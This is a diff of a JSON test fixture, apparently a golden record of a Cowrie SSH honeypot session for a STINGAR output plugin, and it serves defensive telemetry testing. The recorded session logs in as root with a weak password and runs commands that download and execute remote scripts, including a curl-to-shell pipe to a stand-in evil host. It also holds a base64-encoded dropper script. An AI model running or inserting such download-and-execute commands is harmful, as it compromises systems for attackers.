@@ -1,30 +1,61 @@
 {
-  "_comment": "Canonical golden session: shell ref + script download (with inlined bytes) whose content reveals an onward callback. content_b64 decodes to a 2-line dropper script referencing 5.6.7.8. TODO(milestone 1 exit): regenerate from a REAL stock STINGAR v2.3 doc + the new output_stingar byte-inlining — field names below are unverified against the wire.",
+  "_comment": "Canonical golden session, shaped exactly like output_stingar (stingar.py) emits on cowrie.session.closed — verified against plugin source 2026-06-05. files[].content_b64 + files[].resolved_ip are the planned sensor-side additions (DESIGN.md §5.2), not yet stock. content_b64 decodes to a 2-line dropper script referencing onward callback 5.6.7.8.",
   "app": "cowrie",
-  "ident": "a82be2b776ab4161911eb9114b8b1234",
-  "hostname": "sensor-dmz-1",
+  "sensor": {
+    "uuid": "a82be2b776ab4161911eb9114b8b1234",
+    "hostname": "sensor-dmz-1",
+    "tags": { "network": "localnet", "area": "dmz", "misc": ["test_tag"] },
+    "asn": ""
+  },
+  "protocol": "ssh",
+  "start_time": "2026-06-01T14:01:12.482817Z",
+  "end_time": "2026-06-01T14:02:48.119204Z",
   "src_ip": "59.96.137.61",
-  "session": "c0ffee010203",
-  "start_time": "2026-06-01T14:01:12Z",
-  "end_time": "2026-06-01T14:02:48Z",
+  "src_port": 51432,
+  "dst_ip": "100.99.98.97",
+  "dst_port": 2222,
   "hp_data": {
+    "con_type": "accept",
+    "transport": "tcp",
+    "session": "c0ffee010203",
+    "credentials": [
+      { "username": "root", "password": "vizxv", "success": true }
+    ],
     "commands": [
       "uname -a",
       "cd /tmp; wget http://59.96.137.61/bins/x.sh; chmod +x x.sh; ./x.sh",
       "nohup bash -c 'curl -s http://evil.example.com/drop | sh' &"
     ],
-    "credentials": [
-      { "username": "root", "password": "vizxv", "success": true }
-    ],
+    "unknown_commands": [],
+    "urls": ["http://59.96.137.61/bins/x.sh"],
     "files": [
       {
         "url": "http://59.96.137.61/bins/x.sh",
+        "outfile": "var/lib/cowrie/downloads/8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1",
         "shasum": "8c1bd2718a3f3ba16b34a9aa05ea0ec9968fc1d402ca6f33323fbd0a1f06b1a1",
+        "action": "download",
+        "status": "successful",
         "resolved_ip": "59.96.137.61",
         "content_b64": "IyEvYmluL3NoCndnZXQgaHR0cDovLzUuNi43LjgvYmlucy9taXBzOyBjaG1vZCAreCBtaXBzOyAuL21pcHMK"
       }
     ],
-    "client_version": "SSH-2.0-libssh2_1.4.3",
+    "uploads": [],
+    "version": "SSH-2.0-libssh2_1.4.3",
+    "ttylog": null,
+    "arch": null,
+    "client_height": 24,
+    "client_width": 80,
+    "key_fingerprint": null,
+    "kex": {
+      "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
+      "hassh_algorithms": "diffie-hellman-group1-sha1;aes128-ctr;hmac-sha1;none",
+      "kex_algorithms": "diffie-hellman-group1-sha1",
+      "key_algorithms": "ssh-rsa",
+      "enc_cs": "aes128-ctr",
+      "mac_cs": "hmac-sha1",
+      "comp_cs": "none",
+      "lang_cs": ""
+    },
     "unknown_stock_field": "must pass through verbatim"
   }
 }
